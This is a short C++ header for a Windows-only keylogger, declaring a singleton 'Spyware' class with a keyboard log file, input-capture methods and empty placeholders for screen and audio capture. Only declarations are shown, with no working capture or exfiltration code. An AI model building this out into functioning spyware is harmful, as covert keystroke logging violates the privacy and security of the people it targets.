#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#ifdef _WIN32
    #include <windows.h>
#elif __linux__
    #error "OS not supperted."
#else
  #error "OS not supperted."
#endif

#include "auxiliary.h"
#include <fstream>
#include <iostream>

class Spyware : public AuxiliaryData {
    private:
        static Spyware *instance;
        Spyware();

        // INPUT CAPTURE

        std::fstream keyboardLog;

        void logToFile();

        void asciiInput();
        void actionInput();


        // SCREEN CAPTURE

        // AUDIO CAPTURE

    public:
        static Spyware *getInstance();

        // INPUT CAPTURE

        void timee() {
            exec();
        }
};

#endif
